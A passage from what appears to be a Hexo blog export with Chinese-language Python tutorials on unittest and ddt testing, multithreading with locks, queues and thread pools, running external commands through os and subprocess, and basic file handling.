<h3 id="方式五，直接到终端中输入命令"><a href="#方式五，直接到终端中输入命令" class="headerlink" title="方式五，直接到终端中输入命令"></a>方式五，直接到终端中输入命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 测试某个类下的所有函数</span><br><span class="line">D:\project\ut&gt;python -m unittest -v  ut_module.ut1_test</span><br><span class="line"># 测试类中某一个函数</span><br><span class="line">D:\project\ut&gt;python -m unittest -v ut_module.ut1_test.MyUnittest.test_add</span><br><span class="line"># 执行模块下所有test结尾的文件</span><br><span class="line">D:\project\ut&gt;python -m unittest discover D:\project\ut\ut_module &quot;*_test.py&quot;</span><br><span class="line"># 同时执行多个测试类下的测试函数</span><br><span class="line">D:\project\ut&gt;python -m unittest  ut_module.ut1_test.MyUnittest.test_add  ut_module.ut2_test.MyUnittest.test_subtract1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="其他扩展"><a href="#其他扩展" class="headerlink" title="其他扩展"></a>其他扩展</h2><h3 id="unittest的条件装饰器的使用"><a href="#unittest的条件装饰器的使用" class="headerlink" title="unittest的条件装饰器的使用"></a>unittest的条件装饰器的使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class MyTestCase(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    @unittest.skip(&quot;demonstrating skipping&quot;)</span><br><span class="line">    def test_nothing(self):</span><br><span class="line">        self.fail(&quot;shouldn&#x27;t happen&quot;)</span><br><span class="line"></span><br><span class="line">    @unittest.skipIf(mylib.__version__ &lt; (1, 3),</span><br><span class="line">                     &quot;not supported in this library version&quot;)</span><br><span class="line">    def test_format(self):</span><br><span class="line">        # Tests that work for only a certain version of the library.</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    @unittest.skipUnless(sys.platform.startswith(&quot;win&quot;), &quot;requires Windows&quot;)</span><br><span class="line">    def test_windows_support(self):</span><br><span class="line">        # windows specific testing code</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    def test_maybe_skipped(self):</span><br><span class="line">        if not external_resource_available():</span><br><span class="line">            self.skipTest(&quot;external resource not available&quot;)</span><br><span class="line">        # test code that depends on the external resource</span><br><span class="line">        pass</span><br><span class="line">   @unittest.expectedFailure</span><br><span class="line">    def test_fail(self):</span><br><span class="line">        self.assertEqual(1, 0, &quot;broken&quot;)</span><br><span class="line"></span><br><span class="line">@unittest.skip(&quot;showing class skipping&quot;)</span><br><span class="line">class MySkippedTestCase(unittest.TestCase):</span><br><span class="line">    def test_not_run(self):</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<ul>
<li><code>@unittest.skip(reason)</code><br>跳过被此装饰器装饰的测试。 reason 为测试被跳过的原因。</li>
<li><code>@unittest.skipIf(condition, reason)</code><br>当 condition 为真时，跳过被装饰的测试。</li>
<li><code>@unittest.skipUnless(condition, reason)</code><br>跳过被装饰的测试，除非 condition 为真。</li>
</ul>
<p><code>@unittest.expectedFailure</code><br>把测试标记为预计失败。如果测试不通过，会被认为测试成功；如果测试通过了，则被认为是测试失败。</p>
<ul>
<li><code>exception unittest.SkipTest(reason)</code><br>引发此异常以跳过一个测试。</li>
</ul>
<h3 id="参数化"><a href="#参数化" class="headerlink" title="参数化"></a>参数化</h3><ul>
<li>在使用<code>unittest</code>时，希望<code>testcase</code>传参给<code>unittest</code>,下面时用<code>appium</code>的一个伪代码<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class ParametrizedTestCase(unittest.TestCase):</span><br><span class="line">    &quot;&quot;&quot; TestCase classes that want to be parametrized should  </span><br><span class="line">        inherit from this class.  </span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def __init__(self, methodName=&#x27;runTest&#x27;, param=None):</span><br><span class="line">        super(ParametrizedTestCase, self).__init__(methodName)</span><br><span class="line">      # 得到testcase传来的参数</span><br><span class="line">        global devicess</span><br><span class="line">        devicess = param</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def setUpClass(cls):</span><br><span class="line">        pass</span><br><span class="line">        cls.driver = get_driver(devicess)</span><br><span class="line">        cls.logTest = myLog().getLog(cls.devicesName)  # 每个设备实例化一个日志记录器</span><br><span class="line"></span><br><span class="line">    def setUp(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def tearDownClass(cls):</span><br><span class="line">        cls.driver.close_app()</span><br><span class="line">        cls.driver.quit()</span><br><span class="line">        pass</span><br><span class="line">    def tearDown(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def parametrize(testcase_klass, param=None):</span><br><span class="line">        testloader = unittest.TestLoader()</span><br><span class="line">        testnames = testloader.getTestCaseNames(testcase_klass)</span><br><span class="line">        suite = unittest.TestSuite()</span><br><span class="line">        for name in testnames:</span><br><span class="line">            suite.addTest(testcase_klass(name, param=param))</span><br><span class="line">        return suite</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class HomeTest(ParametrizedTestCase):</span><br><span class="line">    def testFirstOpen(self):</span><br><span class="line">        app = &#123;&quot;logTest&quot;: self.logTest, &quot;driver&quot;: self.driver, &quot;path&quot;: PATH(&quot;../yamls/home/firstOpen.yaml&quot;),</span><br><span class="line">               &quot;device&quot;: self.devicesName, &quot;caseName&quot;: sys._getframe().f_code.co_name&#125;</span><br><span class="line"></span><br><span class="line">        page = FirstOpenPage(app)</span><br><span class="line">        page.operate()</span><br><span class="line">        page.checkPoint()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def setUpClass(cls):</span><br><span class="line">        super(HomeTest, cls).setUpClass()</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def tearDownClass(cls):</span><br><span class="line">        super(HomeTest, cls).tearDownClass()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    devices = &#123;&quot;设备信息&quot;&#125;</span><br><span class="line">    suite = unittest.TestSuite()</span><br><span class="line">    suite.addTest(ParametrizedTestCase.parametrize(HomeTest, param=devices))</span><br><span class="line">    unittest.TextTestRunner(verbosity=2).run(suite)</span><br><span class="line">    </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="ddt"><a href="#ddt" class="headerlink" title="ddt"></a>ddt</h2><ul>
<li><code>pip install ddt</code></li>
</ul>
<h3 id="使用json"><a href="#使用json" class="headerlink" title="使用json"></a>使用json</h3><ul>
<li>新建文件 test_data_list.json：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &quot;Hello&quot;,</span><br><span class="line">    &quot;Goodbye&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
<li>新建文件  test_data_dict.json：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;unsorted_list&quot;: [ 10, 12, 15 ],</span><br><span class="line">    &quot;sorted_list&quot;: [ 15, 12, 50 ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>实例代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import unittest</span><br><span class="line">from ddt import ddt, file_data</span><br><span class="line">from ddt_demo.mycode import has_three_elements,is_a_greeting</span><br><span class="line"></span><br><span class="line">@ddt</span><br><span class="line">class FooTestCase(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    @file_data(&#x27;test_data_dict.json&#x27;)</span><br><span class="line">    def test_file_data_json_dict(self, value):</span><br><span class="line">        self.assertTrue(has_three_elements(value))</span><br><span class="line"></span><br><span class="line">    @file_data(&#x27;test_data_list.json&#x27;)</span><br><span class="line">    def test_file_data_json_list(self, value):</span><br><span class="line">        self.assertTrue(is_a_greeting(value))</span><br><span class="line">        </span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    unittest.main(verbosity=2</span><br></pre></td></tr></table></figure>
<h3 id="使用yaml文件"><a href="#使用yaml文件" class="headerlink" title="使用yaml文件"></a>使用yaml文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import unittest</span><br><span class="line">from ddt import ddt, file_data</span><br><span class="line">from ddt_demo.mycode import has_three_elements,is_a_greeting</span><br><span class="line"></span><br><span class="line">@ddt</span><br><span class="line">class FooTestCase(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    @file_data(&#x27;test_data_dict.yaml&#x27;)</span><br><span class="line">    def test_file_data_yaml_dict(self, value):</span><br><span class="line">        self.assertTrue(has_three_elements(value))</span><br><span class="line"></span><br><span class="line">    @file_data(&#x27;test_data_list.yaml&#x27;)</span><br><span class="line">    def test_file_data_yaml_list(self, value):</span><br><span class="line">        self.assertTrue(is_a_greeting(value))</span><br><span class="line">        </span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    unittest.main(verbosity=2)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python-多线程知识全面解析</title>
    <url>/aposts/4c7badec/</url>
    <content><![CDATA[<h2 id="非阻塞启动线程"><a href="#非阻塞启动线程" class="headerlink" title="非阻塞启动线程"></a>非阻塞启动线程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">def one_thread(name,id):</span><br><span class="line">    print(&quot;start....&quot;)</span><br><span class="line">    print(name)</span><br><span class="line">    print(id)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    print(&quot;end...&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;start thread&quot;)</span><br><span class="line">threading.Thread(target=one_thread, args=(), kwargs=&#123;&quot;name&quot;: 111, &quot;id&quot;: 222&#125;).start()</span><br><span class="line"># args是一个list</span><br><span class="line"># kwargs是一个字典，需要对应函数的key</span><br><span class="line">print(&quot;end thread&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li>得到值如下，线程启动函数后，非阻塞执行<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start thread</span><br><span class="line">start....</span><br><span class="line">111</span><br><span class="line">222</span><br><span class="line">end thread</span><br><span class="line">end...</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="多线程并发处理"><a href="#多线程并发处理" class="headerlink" title="多线程并发处理"></a>多线程并发处理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class myThread(threading.Thread):</span><br><span class="line">    def __init__(self, threadID, name):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadID = threadID</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        print_time(self.threadID, self.name)</span><br><span class="line"></span><br><span class="line">num = 0</span><br><span class="line">def print_time(threadID, name):</span><br><span class="line">    global num</span><br><span class="line">    # 每一个线程循环10次，最终总循环次数为30次</span><br><span class="line">    for i in range(10):</span><br><span class="line">        print(&quot;start run&quot;)</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        print(i)</span><br><span class="line">        num += 1</span><br><span class="line">    print(&quot;thread_id=%s:name=%s&quot; % (threadID, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    threads = []</span><br><span class="line">    # 新增三个线程</span><br><span class="line">    for i in range(3):</span><br><span class="line">        name = &quot;Thread-%d&quot; % i</span><br><span class="line">        t = myThread(i, name)</span><br><span class="line">        t.start()</span><br><span class="line">        threads.append(t)</span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br><span class="line">    print(&quot;所有线程执行完毕&quot;)</span><br><span class="line">    print(&quot;总循环次数为：%s&quot; % num)</span><br></pre></td></tr></table></figure>
<ul>
<li>打印结果：每次运行三个线程，每个线程循环打印10次<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start run</span><br><span class="line">start run</span><br><span class="line">start run</span><br><span class="line">0</span><br><span class="line">0</span><br><span class="line">...</span><br><span class="line">thread_id=1:name=Thread-1</span><br><span class="line">所有线程执行完毕</span><br><span class="line">总循环次数为：30</span><br></pre></td></tr></table></figure></li>
<li>多线程共享资源，可以使用全局变量<code>global </code></li>
</ul>
<h2 id="多线程加锁"><a href="#多线程加锁" class="headerlink" title="多线程加锁"></a>多线程加锁</h2><ul>
<li>对于那些需要每次只允许一个线程操作的数据，可以将其操作放到 acquire 和 release 方法之间</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"># 创建锁对象</span><br><span class="line">lock = threading.Lock()</span><br><span class="line">num = 0</span><br><span class="line"></span><br><span class="line">def run(n):</span><br><span class="line">    global num</span><br><span class="line">    for i in range(10):</span><br><span class="line">        # 加锁  为了确保下面代码只能由一个线程从头到尾的执行</span><br><span class="line">        # 会阻止多线程的并发执行，所以效率会大大降低</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        lock.acquire()</span><br><span class="line">        try:</span><br><span class="line">            num = num - n</span><br><span class="line">            num = num + n</span><br><span class="line">        finally:</span><br><span class="line">            # 解锁</span><br><span class="line">            lock.release()</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        with lock:</span><br><span class="line">            time.sleep(2)</span><br><span class="line">            print(&quot;start&quot;)</span><br><span class="line">            num = num + 1</span><br><span class="line">            print(&quot;==============&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    t1 = threading.Thread(target=run,args=(6,))</span><br><span class="line">    t2 = threading.Thread(target=run,args=(9,))</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line">    print(&quot;num = %s&quot;%(num))</span><br></pre></td></tr></table></figure>
<ul>
<li>打印结果是每次只能运行一个线程</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start</span><br><span class="line">==============</span><br><span class="line">...</span><br><span class="line">num = 20</span><br></pre></td></tr></table></figure>
<h2 id="多线程与队列"><a href="#多线程与队列" class="headerlink" title="多线程与队列"></a>多线程与队列</h2><ul>
<li>我们经常会遇到这样的一个问题，这里有成千上万条数据，每次需要取出其中的一条数据进行处理，那么引入多线程该怎么进行任务分配？</li>
<li>我们可以将数据进行分割然后交给多个线程去跑，可是这并不是一个明智的做法。在这里我们可以使用队列与线程相结合的方式进行任务分配。</li>
<li><strong>队列线程的思想</strong>： 首先创建一个全局共享的队列，队列中只存在有限个元素，并将所有的数据逐条加入到队列中，并调用队列的join函数进行等待。之后便可以开启若干线程，线程的任务就是不断的从队列中取数据进行处理就可以了。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">q = queue.Queue(10)</span><br><span class="line"></span><br><span class="line">threadLock = threading.Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class myThread(threading.Thread):</span><br><span class="line">    def __init__(self, threadID, name):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadID = threadID</span><br><span class="line">        self.name = name</span><br><span class="line">        self.exitFlag = 0</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        while not self.exitFlag:</span><br><span class="line">            threadLock.acquire()</span><br><span class="line">            if not q.empty():</span><br><span class="line">                id = q.get()</span><br><span class="line">                print_time(self.name, id)</span><br><span class="line">                threadLock.release()</span><br><span class="line">            else:</span><br><span class="line">                threadLock.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def print_time(threadName, id):</span><br><span class="line">    print (&quot;%s:%s:%s&quot;%(threadName,time.ctime(time.time()),id))</span><br><span class="line">    # pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 创建3个线程</span><br><span class="line">threads = []</span><br><span class="line">for i in range(3):</span><br><span class="line">    name = &quot;Thread-%d&quot; % i</span><br><span class="line">    t = myThread(i, name)</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line">print(threads)</span><br><span class="line"></span><br><span class="line"># 新增队列数据</span><br><span class="line">for i in range(10000):</span><br><span class="line">    q_name = &quot;Queue:%d&quot; % i</span><br><span class="line">    q.put(q_name)</span><br><span class="line"></span><br><span class="line"># 等待队列清空</span><br><span class="line">while not q.empty():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 也可以join方法，与上同效</span><br><span class="line"># q.join()</span><br><span class="line"></span><br><span class="line"># 通知线程，处理完之后关闭</span><br><span class="line">for t in threads:</span><br><span class="line">    t.exitFlag = 1</span><br><span class="line"></span><br><span class="line"># 等待所有线程结束之后才退出</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br><span class="line">print(&quot;Exiting Main Thread&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li>这里必须要在判断<code>q.empty()</code>前加上线程锁，因为可能会出现这样的一种情况。</li>
<li>某一时刻，队列中还有一个元素，该元素正在被线程A取出，而与此同时线程B正在判断队列q是否为空，而此时线程B中队列q不为空进入后面的操作，但是待B去取元素时，最后一个元素已经被A取出，造成线程等待，显示出被挂起的状态。</li>
<li>我们也可以通过加入<code>q.get(timeout=10)</code>超时操作来弥补这一问题。</li>
<li>打印的结果<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&lt;myThread(Thread-0, started 6568)&gt;, &lt;myThread(Thread-1, started 7724)&gt;, &lt;myThread(Thread-2, started 7796)&gt;]</span><br><span class="line">Thread-1:Sat Aug 22 11:36:29 2020:Queue:0</span><br><span class="line">Thread-1:Sat Aug 22 11:36:29 2020:Queue:1</span><br><span class="line">...</span><br><span class="line">Thread-1:Sat Aug 22 11:36:30 2020:Queue:9998</span><br><span class="line">Thread-1:Sat Aug 22 11:36:30 2020:Queue:9999</span><br><span class="line">Exiting Main Thread</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="ThreadPoolExecutor线程池的使用"><a href="#ThreadPoolExecutor线程池的使用" class="headerlink" title="ThreadPoolExecutor线程池的使用"></a>ThreadPoolExecutor线程池的使用</h2><ul>
<li><strong>锁依然可以运用到线程池</strong></li>
<li><code>map</code>的使用，接受一个List的数据，会循环调用<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from concurrent.futures.thread import ThreadPoolExecutor</span><br><span class="line">import time</span><br><span class="line">num = 0</span><br><span class="line">def print_time(data):</span><br><span class="line">    global num</span><br><span class="line">    num += 1</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;start_%s&quot; % data)</span><br><span class="line">    print(&quot;============&quot;)</span><br><span class="line">data = []</span><br><span class="line">for i in range(50):</span><br><span class="line">    data.append(i)</span><br><span class="line">with ThreadPoolExecutor(10) as pool:</span><br><span class="line">    result = pool.map(print_time, data)</span><br><span class="line"># 等待所有线程执行完毕</span><br><span class="line">for i in result:</span><br><span class="line">    pass</span><br><span class="line">print(&quot;循环次数=%s&quot; % num)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>打印结果为：每次启动10个线程，启动了5次<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">============</span><br><span class="line">start_46</span><br><span class="line">start_49</span><br><span class="line">============</span><br><span class="line">============</span><br><span class="line">循环次数=50</span><br></pre></td></tr></table></figure></li>
<li><code>submit</code>接受list的数据，也可以接受字典<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rom concurrent.futures.thread import ThreadPoolExecutor</span><br><span class="line">from concurrent.futures import as_completed</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">def print_time(data):</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;start_%s&quot; % data)</span><br><span class="line">    print(&quot;============&quot;)</span><br><span class="line">data = []</span><br><span class="line">for i in range(50):</span><br><span class="line">    data.append(i)</span><br><span class="line">with ThreadPoolExecutor(10) as executor:</span><br><span class="line">    future_list = []</span><br><span class="line">    for i in range(10):</span><br><span class="line">        # future = executor.submit(print_time,data)</span><br><span class="line">        future = executor.submit(print_time, &#123;&quot;name&quot;: 111, &quot;id&quot;: 222&#125;)</span><br><span class="line">        future_list.append(future)</span><br><span class="line">    for res in as_completed(future_list):  # 这个futrure_list是你future对象的列表</span><br><span class="line">        print(res.result())</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.jianshu.com/p/dd1b4077666e">https://www.jianshu.com/p/dd1b4077666e</a></li>
<li><a href="https://blog.csdn.net/vspiders/article/details/80724583">https://blog.csdn.net/vspiders/article/details/80724583</a></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-执行外部命令的几种方式</title>
    <url>/aposts/61a75a58/</url>
    <content><![CDATA[<h2 id="os-system"><a href="#os-system" class="headerlink" title="os.system"></a><code>os.system</code></h2><ul>
<li>执行的时候程序会打出cmd在linux上执行的信息</li>
<li>执行命令成功返回为0，否则为1</li>
<li>如果想获取在cmd输出的内容，是没办法获到的<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t2 = os.system(&quot;1adb devices&quot;)</span><br><span class="line">t3 = os.system(&quot;adb devices&quot;)</span><br><span class="line">print(t2)  # 打印为1</span><br><span class="line">print(t3) # 打印为0</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="subprocess-call"><a href="#subprocess-call" class="headerlink" title="subprocess.call"></a><code>subprocess.call</code></h2><ul>
<li>取代<code>os.system</code>，但是也是无法获取cmd输出的内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">t = subprocess.call(&#x27;adb devices&#x27;)</span><br><span class="line">print(t) # 打印为0</span><br></pre></td></tr></table></figure>

<h2 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen"></a><code>os.popen</code></h2><ul>
<li>popen返回的是一个file对象，跟open打开文件一样操作了，r是以读的方式打开</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">output = os.popen(&#x27;adb devices&#x27;)</span><br><span class="line">print(output.read()) # 得到List of devices attached</span><br></pre></td></tr></table></figure>

<h2 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen"></a><code>subprocess.Popen</code></h2><ul>
<li><code>subprocess</code>模块代替<code>os.system</code>、<code>os.popen</code>,能够得到命令输出的值</li>
</ul>
<h3 id="shell参数"><a href="#shell参数" class="headerlink" title="shell参数"></a><code>shell</code>参数</h3><ul>
<li>在<code>linux</code>下，当<code>shell=False</code>（默认）时，<code>Popen</code>使用<code>os.execvp()</code>来执行子程序。<code>args</code>一般要是一个【列表】。如果<code>args</code>是个字符串的<br>话，会被当做是可执行文件的路径，这样就不能传入任何参数了。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.Popen(&quot;cat test.txt&quot;, shell=True)</span><br><span class="line">这是因为它相当于</span><br><span class="line">subprocess.Popen([&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat test.txt&quot;])</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="stdin-stdout-stderr-参数"><a href="#stdin-stdout-stderr-参数" class="headerlink" title="stdin stdout stderr 参数"></a><code>stdin</code> <code>stdout</code> <code>stderr</code> 参数</h3><ul>
<li>分别表示程序的标准输入、输出、错误句柄。他们可以是<code>PIPE</code>，文件描述符或文件对象，也可以设置为<code>None</code>表示从父进程继承</li>
<li><strong>执行结果使用管道输出的实例：</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pipe=subprocess.Popen(&quot;adb devices&quot;,shell=True,stdout=subprocess.PIPE).stdout</span><br><span class="line">print(pipe.read()) # 得到值b&#x27;List of devices attached\r\n\r\n&#x27;</span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>执行结果保存在文件实例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &quot;adb shell ls /sdcard/ | findstr aa.png&quot;  </span><br><span class="line">fhandle = open(r&quot;e:\aa.txt&quot;, &quot;w&quot;)  </span><br><span class="line">pipe = subprocess.Popen(cmd, shell=True, stdout=fhandle).stdout  </span><br><span class="line">fhandle.close()</span><br></pre></td></tr></table></figure></li>
<li><p>子进程的文本流控制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">child1 = subprocess.Popen([&quot;ls&quot;,&quot;-l&quot;], stdout=subprocess.PIPE)</span><br><span class="line">child2 = subprocess.Popen([&quot;wc&quot;], stdin=child1.stdout,stdout=subprocess.PIPE)</span><br><span class="line">out = child2.communicate()</span><br><span class="line">print out</span><br></pre></td></tr></table></figure></li>
<li><p>child1.stdout–&gt;subprocess.PIPE</p>
</li>
<li><p>child2.stdin&lt;–subprocess.PIPE        </p>
</li>
<li><p>child2.stdout–&gt;subprocess.PIPE</p>
</li>
<li><p>相当于将child1.stdout–&gt;child2.stdin-&gt;child2.stdout-&gt;subprocess.PIPE</p>
</li>
<li><p>subprocess.PIPE实际上为文本流提供一个缓存区。child1的stdout将文本输出到缓存区，随后child2的stdin从该PIPE中将文本读取走。child2的输出文本也被存放在PIPE中，直到<code>communicate()</code>方法从PIPE中读取出PIPE中的文本。</p>
</li>
<li><p>要注意的是，<code>communicate()</code>是Popen对象的一个方法，该方法会阻塞父进程，直到子进程完成。</p>
</li>
<li><p><strong>我们还可以利用communicate()方法来使用PIPE给子进程输入:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">child = subprocess.Popen([&quot;cat&quot;], stdin=subprocess.PIPE)</span><br><span class="line">child.communicate(&quot;vamei&quot;) //()不为空，则写入subprocess.PIPE，为空，则从subprocess.PIPE读取</span><br></pre></td></tr></table></figure></li>
<li><p>subprocess.PIPE–&gt;child.stdin</p>
</li>
<li><p>commiuncate相当于写入subprocess.PIPE，然后child从subprocess.PIPE读取</p>
</li>
<li><p><strong>利用python的subprocess模块执行外部命令, 并捕获stdout, stderr的输出</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># print ’popen3:’</span><br><span class="line"></span><br><span class="line">def external_cmd(cmd, msg_in=&#x27;&#x27;):</span><br><span class="line">    try:</span><br><span class="line">        proc = subprocess.Popen(cmd,</span><br><span class="line">                                shell=True,</span><br><span class="line">                                stdin=subprocess.PIPE,</span><br><span class="line">                                stdout=subprocess.PIPE,</span><br><span class="line">                                stderr=subprocess.PIPE,</span><br><span class="line">                                )</span><br><span class="line">        stdout_value, stderr_value = proc.communicate(msg_in)</span><br><span class="line">        return stdout_value, stderr_value</span><br><span class="line">    except ValueError as err:</span><br><span class="line">        # log(&quot;ValueError: %s&quot; % err)</span><br><span class="line">        return None, None</span><br><span class="line">    except IOError as err:</span><br><span class="line">        # log(&quot;IOError: %s&quot; % err)</span><br><span class="line">        return None, None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    stdout_val, stderr_val = external_cmd(&#x27;dir&#x27;)</span><br><span class="line">    print (&#x27;Standard Output: %s&#x27; % stdout_val)</span><br><span class="line">    print (&#x27;Standard Error: %s&#x27; % stderr_val)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>得到命令的返回值，wait</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=subprocess.Popen(&quot;dir&quot;, shell=True)  </span><br><span class="line">p.wait()</span><br></pre></td></tr></table></figure></li>
<li><p>但是Popen函数有一个缺陷，就是它是一个阻塞的方法。如果运行cmd时产生的内容非常多，函数非常容易阻塞住。解决办法是不使用wait()方法，但是也不能获得执行的返回值了。</p>
</li>
</ul>
<h2 id="commands-getstatusoutput"><a href="#commands-getstatusoutput" class="headerlink" title="commands.getstatusoutput"></a><code>commands.getstatusoutput</code></h2><ul>
<li>不推荐使用，因为在python3中被废弃</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python-文件,文件夹操作全面解析</title>
    <url>/aposts/8f15e7ee/</url>
    <content><![CDATA[<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with open(&#x27;data1.txt&#x27;, mode=&#x27;w&#x27;, encoding=&quot;utf-8&quot;) as f:</span><br><span class="line">    data = &#x27;11111e&#x27;</span><br><span class="line">    f.seek(10)   #光标移动到10的位置</span><br><span class="line">    f.write(data)</span><br><span class="line"></span><br><span class="line">  f1 = open(r&#x27;D:\project\operate_file\data.txt&#x27;, &quot;r&quot;, encoding=&quot;utf-8&quot;)</span><br><span class="line">    print(f1.readline())</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure>
<ul>
<li>打开多个文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with open(&quot;file_test&quot;,&quot;r&quot;,encoding=&quot;utf-8&quot;) as f, \</span><br><span class="line">        open(&quot;file_test2&quot;,&quot;r&quot;,encoding=&quot;utf-8&quot;) as f2:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></li>
</ul>
